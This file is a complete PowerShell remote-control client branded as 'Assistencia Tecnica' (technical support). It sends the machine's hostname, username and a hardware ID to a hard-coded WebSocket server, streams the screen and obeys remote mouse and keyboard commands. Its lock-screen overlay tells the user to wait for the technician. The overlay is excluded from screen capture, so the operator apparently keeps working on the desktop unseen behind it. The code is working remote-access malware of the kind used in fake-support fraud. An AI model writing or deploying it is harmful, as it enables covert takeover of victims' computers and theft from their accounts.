Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$code = @"
using System;
using System.Runtime.InteropServices;

public class WinAPI {
    [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
    [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, int dwData, int dwExtraInfo);
    [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
    [DllImport("user32.dll")] public static extern int GetSystemMetrics(int nIndex);
    [DllImport("user32.dll")] public static extern IntPtr GetDesktopWindow();
    [DllImport("user32.dll")] public static extern IntPtr GetWindowDC(IntPtr hWnd);
    [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int rop);
    [DllImport("user32.dll")] public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
    [DllImport("user32.dll")] public static extern bool SetWindowDisplayAffinity(IntPtr hWnd, uint dwAffinity);
    [DllImport("user32.dll")] public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
    [DllImport("user32.dll")] public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
    [DllImport("user32.dll")] public static extern bool SetLayeredWindowAttributes(IntPtr hwnd, uint crKey, byte bAlpha, uint dwFlags);
    [DllImport("kernel32.dll")] public static extern bool SetConsoleTitleW(string title);

    public const uint MOUSEEVENTF_LEFTDOWN = 0x02;
    public const uint MOUSEEVENTF_LEFTUP = 0x04;
    public const uint MOUSEEVENTF_RIGHTDOWN = 0x08;
    public const uint MOUSEEVENTF_RIGHTUP = 0x10;
    public const uint MOUSEEVENTF_MIDDLEDOWN = 0x20;
    public const uint MOUSEEVENTF_MIDDLEUP = 0x40;
    public const uint MOUSEEVENTF_WHEEL = 0x800;
    public const uint KEYEVENTF_KEYUP = 0x02;
}
"@
Add-Type -TypeDefinition $code

$Global:SERVER_URL = "wss://web-production-9d7cc.up.railway.app"
$Global:clientId = $null
$Global:ws = $null
$Global:running = $true
$Global:panelConnected = $false
$Global:screenLocked = $false
$Global:lockForm = $null
$Global:scale = 0.75
$Global:quality = 70

function Get-HWID {
    try {
        $uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
        $mac = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress } | Select-Object -First 1).MACAddress
        $hash = [System.Security.Cryptography.SHA256]::Create()
        $bytes = [System.Text.Encoding]::UTF8.GetBytes("$uuid$mac")
        $hashBytes = $hash.ComputeHash($bytes)
        return ([BitConverter]::ToString($hashBytes) -replace '-','').Substring(0,16)
    } catch { return "N/A" }
}

function Get-SystemInfo {
    return @{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os = [System.Environment]::OSVersion.VersionString
        hwid = Get-HWID
    }
}

function Capture-Screen {
    $width = [WinAPI]::GetSystemMetrics(0)
    $height = [WinAPI]::GetSystemMetrics(1)
    $scaledW = [int]($width * $Global:scale)
    $scaledH = [int]($height * $Global:scale)

    $bitmap = New-Object System.Drawing.Bitmap($width, $height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen(0, 0, 0, 0, [System.Drawing.Size]::new($width, $height))
    $graphics.Dispose()

    $scaled = New-Object System.Drawing.Bitmap($scaledW, $scaledH)
    $g2 = [System.Drawing.Graphics]::FromImage($scaled)
    $g2.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
    $g2.DrawImage($bitmap, 0, 0, $scaledW, $scaledH)
    $g2.Dispose()
    $bitmap.Dispose()

    $ms = New-Object System.IO.MemoryStream
    $encoder = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
    $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
    $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, $Global:quality)
    $scaled.Save($ms, $encoder, $encoderParams)
    $scaled.Dispose()

    $base64 = [Convert]::ToBase64String($ms.ToArray())
    $ms.Dispose()

    return @{ frame = $base64; width = $scaledW; height = $scaledH }
}

function Move-MouseTo($x, $y) {
    $realX = [int]($x / $Global:scale)
    $realY = [int]($y / $Global:scale)
    $null = [WinAPI]::SetCursorPos($realX, $realY)
}

function Click-Mouse($x, $y, $button, $clicks) {
    Move-MouseTo $x $y
    Start-Sleep -Milliseconds 10

    for ($i = 0; $i -lt $clicks; $i++) {
        switch ($button) {
            "right" {
                [void][WinAPI]::mouse_event([WinAPI]::MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0)
                Start-Sleep -Milliseconds 10
                [void][WinAPI]::mouse_event([WinAPI]::MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0)
            }
            "middle" {
                [void][WinAPI]::mouse_event([WinAPI]::MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0)
                Start-Sleep -Milliseconds 10
                [void][WinAPI]::mouse_event([WinAPI]::MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0)
            }
            default {
                [void][WinAPI]::mouse_event([WinAPI]::MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
                Start-Sleep -Milliseconds 10
                [void][WinAPI]::mouse_event([WinAPI]::MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
            }
        }
        Start-Sleep -Milliseconds 10
    }
}

function Scroll-Mouse($delta) {
    [void][WinAPI]::mouse_event([WinAPI]::MOUSEEVENTF_WHEEL, 0, 0, [int]($delta * 120), 0)
}

function Press-Key($key) {
    $keyMap = @{
        'Enter' = 0x0D; 'Backspace' = 0x08; 'Tab' = 0x09; 'Escape' = 0x1B
        'ArrowUp' = 0x26; 'ArrowDown' = 0x28; 'ArrowLeft' = 0x25; 'ArrowRight' = 0x27
        'Delete' = 0x2E; 'Home' = 0x24; 'End' = 0x23; 'PageUp' = 0x21; 'PageDown' = 0x22
        ' ' = 0x20; 'F1' = 0x70; 'F2' = 0x71; 'F3' = 0x72; 'F4' = 0x73
        'F5' = 0x74; 'F6' = 0x75; 'F7' = 0x76; 'F8' = 0x77
        'F9' = 0x78; 'F10' = 0x79; 'F11' = 0x7A; 'F12' = 0x7B
    }

    if ($keyMap.ContainsKey($key)) {
        $vk = $keyMap[$key]
    } elseif ($key.Length -eq 1) {
        $vk = [int][char]$key.ToUpper()
    } else {
        return
    }

    [void][WinAPI]::keybd_event($vk, 0, 0, 0)
    Start-Sleep -Milliseconds 10
    [void][WinAPI]::keybd_event($vk, 0, [WinAPI]::KEYEVENTF_KEYUP, 0)
}

function Press-KeyCombo($keys) {
    $modMap = @{ 'Control' = 0x11; 'Alt' = 0x12; 'Shift' = 0x10; 'Meta' = 0x5B }
    $keyMap = @{
        'Enter' = 0x0D; 'Backspace' = 0x08; 'Tab' = 0x09; 'Escape' = 0x1B
        'ArrowUp' = 0x26; 'ArrowDown' = 0x28; 'ArrowLeft' = 0x25; 'ArrowRight' = 0x27
        'Delete' = 0x2E; ' ' = 0x20
    }

    $vks = @()
    foreach ($k in $keys) {
        if ($modMap.ContainsKey($k)) { $vks += $modMap[$k] }
        elseif ($keyMap.ContainsKey($k)) { $vks += $keyMap[$k] }
        elseif ($k.Length -eq 1) { $vks += [int][char]$k.ToUpper() }
    }

    foreach ($vk in $vks) { [void][WinAPI]::keybd_event($vk, 0, 0, 0) }
    Start-Sleep -Milliseconds 50
    for ($i = $vks.Count - 1; $i -ge 0; $i--) { [void][WinAPI]::keybd_event($vks[$i], 0, [WinAPI]::KEYEVENTF_KEYUP, 0) }
}

function Show-LockScreen($message) {
    if ($Global:screenLocked) { return }
    $Global:screenLocked = $true

    $job = Start-Job -ScriptBlock {
        param($msg)
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        Add-Type @"
using System;
using System.Runtime.InteropServices;
public class LockWin {
    [DllImport("user32.dll")] public static extern bool SetWindowDisplayAffinity(IntPtr hWnd, uint dwAffinity);
    [DllImport("user32.dll")] public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
    [DllImport("user32.dll")] public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
    [DllImport("user32.dll")] public static extern bool SetLayeredWindowAttributes(IntPtr hwnd, uint crKey, byte bAlpha, uint dwFlags);
}
"@

        $form = New-Object System.Windows.Forms.Form
        $form.Text = ""
        $form.FormBorderStyle = 'None'
        $form.WindowState = 'Maximized'
        $form.TopMost = $true
        $form.BackColor = [System.Drawing.Color]::FromArgb(10, 10, 10)
        $form.ShowInTaskbar = $false

        $label1 = New-Object System.Windows.Forms.Label
        $label1.Text = [char]0x1F512
        $label1.Font = New-Object System.Drawing.Font("Segoe UI Emoji", 72)
        $label1.ForeColor = [System.Drawing.Color]::FromArgb(245, 158, 11)
        $label1.BackColor = [System.Drawing.Color]::Transparent
        $label1.AutoSize = $true

        $label2 = New-Object System.Windows.Forms.Label
        $label2.Text = $msg
        $label2.Font = New-Object System.Drawing.Font("Segoe UI", 28, [System.Drawing.FontStyle]::Bold)
        $label2.ForeColor = [System.Drawing.Color]::White
        $label2.BackColor = [System.Drawing.Color]::Transparent
        $label2.AutoSize = $true

        $label3 = New-Object System.Windows.Forms.Label
        $label3.Text = "Por favor, aguarde o tecnico liberar a tela."
        $label3.Font = New-Object System.Drawing.Font("Segoe UI", 14)
        $label3.ForeColor = [System.Drawing.Color]::Gray
        $label3.BackColor = [System.Drawing.Color]::Transparent
        $label3.AutoSize = $true

        $form.Add_Shown({
            $sw = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
            $sh = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
            $label1.Location = New-Object System.Drawing.Point((($sw - $label1.Width) / 2), (($sh / 2) - 150))
            $label2.Location = New-Object System.Drawing.Point((($sw - $label2.Width) / 2), (($sh / 2) - 20))
            $label3.Location = New-Object System.Drawing.Point((($sw - $label3.Width) / 2), (($sh / 2) + 50))

            $hwnd = $form.Handle
            [LockWin]::SetWindowDisplayAffinity($hwnd, 0x11)
            $style = [LockWin]::GetWindowLong($hwnd, -20)
            [LockWin]::SetWindowLong($hwnd, -20, $style -bor 0x80000 -bor 0x20)
            [LockWin]::SetLayeredWindowAttributes($hwnd, 0, 255, 2)
        })

        $form.Controls.Add($label1)
        $form.Controls.Add($label2)
        $form.Controls.Add($label3)

        $form.Add_KeyDown({ $_.Handled = $true })
        $form.Add_KeyPress({ $_.Handled = $true })

        [System.Windows.Forms.Application]::Run($form)
    } -ArgumentList $message

    $Global:lockJob = $job
}

function Hide-LockScreen {
    $Global:screenLocked = $false
    if ($Global:lockJob) {
        Stop-Job -Job $Global:lockJob -ErrorAction SilentlyContinue
        Remove-Job -Job $Global:lockJob -Force -ErrorAction SilentlyContinue
        $Global:lockJob = $null
    }
}

function Start-Client {
    $null = [WinAPI]::SetConsoleTitleW("Assistencia Tecnica")

    while ($Global:running) {
        try {
            $ws = New-Object System.Net.WebSockets.ClientWebSocket
            $uri = [Uri]$Global:SERVER_URL
            $null = $ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()
            Write-Host "  Conectado ao servidor"

            $info = Get-SystemInfo
            $register = @{ type = "register-client" } + $info | ConvertTo-Json -Compress
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($register)
            $segment = [System.ArraySegment[byte]]::new($bytes)
            $null = $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
            Write-Host "  Registro enviado, estado: $($ws.State)"

            $buffer = [byte[]]::new(65536)
            $frameTimer = [System.Diagnostics.Stopwatch]::StartNew()
            $pingTimer = [System.Diagnostics.Stopwatch]::StartNew()
            $recvTask = $null

            while ($Global:running) {
                # Check WebSocket state
                if ($ws.State.ToString() -ne 'Open') {
                    Write-Host "  WebSocket fechado: $($ws.State)"
                    break
                }

                # Start receive task if not running
                if ($recvTask -eq $null) {
                    $segment = [System.ArraySegment[byte]]::new($buffer)
                    $recvTask = $ws.ReceiveAsync($segment, [System.Threading.CancellationToken]::None)
                }

                # Check if receive completed
                if ($recvTask.IsCompleted) {
                    try {
                        $result = $recvTask.Result
                        $recvTask = $null

                        if ($result.MessageType.ToString() -eq 'Close') {
                            Write-Host "  Servidor fechou conexao"
                            break
                        }

                        if ($result.Count -gt 0) {
                            $json = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $result.Count)
                            $msg = $json | ConvertFrom-Json

                            switch ($msg.type) {
                                "registered" {
                                    $Global:clientId = $msg.clientId
                                    Write-Host "  Codigo: $($Global:clientId)"
                                }
                                "panel-connected" {
                                    $Global:panelConnected = $true
                                    Write-Host "  Painel conectado!"
                                }
                                "panel-disconnected" {
                                    $Global:panelConnected = $false
                                    Hide-LockScreen
                                    Write-Host "  Painel desconectado"
                                }
                                "mouse-move" { Move-MouseTo $msg.x $msg.y }
                                "mouse-click" {
                                    Write-Host "  Click: $($msg.x),$($msg.y) btn=$($msg.button)"
                                    Click-Mouse $msg.x $msg.y $msg.button $(if ($msg.clicks) { $msg.clicks } else { 1 })
                                }
                                "mouse-scroll" { Scroll-Mouse $msg.delta }
                                "key-press" {
                                    Write-Host "  Key: $($msg.key)"
                                    Press-Key $msg.key
                                }
                                "key-combination" { Press-KeyCombo $msg.keys }
                                "lock-screen" { Show-LockScreen $(if ($msg.message) { $msg.message } else { "Aguarde..." }) }
                                "unlock-screen" { Hide-LockScreen }
                                "set-quality" {
                                    $Global:quality = if ($msg.quality) { $msg.quality } else { 70 }
                                    $Global:scale = if ($msg.scale) { $msg.scale } else { 0.75 }
                                }
                                "disconnect-client" {
                                    Hide-LockScreen
                                    $Global:running = $false
                                }
                            }
                        }
                    } catch {
                        Write-Host "  Erro recebendo: $($_.Exception.Message)"
                        break
                    }
                }

                # Send frames (100ms = 10 FPS)
                if ($Global:panelConnected -and $frameTimer.ElapsedMilliseconds -ge 100) {
                    $frameTimer.Restart()
                    try {
                        $capture = Capture-Screen
                        $frame = @{
                            type = "screen-frame"
                            clientId = $Global:clientId
                            frame = $capture.frame
                            width = $capture.width
                            height = $capture.height
                        } | ConvertTo-Json -Compress

                        $bytes = [System.Text.Encoding]::UTF8.GetBytes($frame)
                        $seg = [System.ArraySegment[byte]]::new($bytes)
                        $null = $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
                    } catch {
                        Write-Host "  Erro enviando frame: $($_.Exception.Message)"
                        break
                    }
                }

                # Keep-alive ping every 15 seconds
                if ($pingTimer.ElapsedMilliseconds -ge 15000) {
                    $pingTimer.Restart()
                    try {
                        $ping = '{"type":"ping"}'
                        $bytes = [System.Text.Encoding]::UTF8.GetBytes($ping)
                        $seg = [System.ArraySegment[byte]]::new($bytes)
                        $null = $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
                    } catch {}
                }

                Start-Sleep -Milliseconds 20
            }

            $ws.Dispose()
        } catch {
            Write-Host "  Erro: $($_.Exception.Message)"
            if ($_.Exception.InnerException) {
                Write-Host "  Inner: $($_.Exception.InnerException.Message)"
            }
            Write-Host "  Reconectando em 5s..."
            Start-Sleep -Seconds 5
        }
    }
}

Write-Host ""
Write-Host "  =================================================="
Write-Host "  |                                                |"
Write-Host "  |            ASSISTENCIA TECNICA                 |"
Write-Host "  |                                                |"
Write-Host "  =================================================="
Write-Host ""

Start-Client
